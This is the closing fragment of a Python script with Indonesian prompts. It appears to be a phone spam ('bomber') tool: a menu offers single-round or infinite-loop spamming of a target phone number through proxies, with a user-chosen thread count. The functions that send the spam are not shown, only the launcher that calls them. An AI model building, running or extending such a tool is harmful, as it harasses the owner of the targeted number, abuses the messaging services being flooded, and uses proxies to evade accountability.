    print(f"\n{C}┌─────────────────────────────────────────────────┐")
    print(f"{C}│{W}  PILIH MODE                                   {C}│")
    print(f"{C}├─────────────────────────────────────────────────┤")
    print(f"{C}│{W}  [1] Single Round (dengan proxy)             {C}│")
    print(f"{C}│{W}  [2] Infinite Loop (dengan proxy)            {C}│")
    print(f"{C}└─────────────────────────────────────────────────┘{RS}")
    
    choice = input(f"{C}[?] Pilih mode (1-2): {W}").strip()
    
    if choice == '1':
        threads = input(f"{C}[?] Jumlah thread (1-10, default 5): {W}").strip()
        try:
            threads = int(threads) if threads else 5
            threads = max(1, min(10, threads))
        except:
            threads = 5
        spam_with_proxy(phone, threads)
    elif choice == '2':
        spam_infinite_with_proxy(phone)
    else:
        print(f"{R}Pilihan tidak valid!{RS}")

if __name__ == "__main__":
    main()
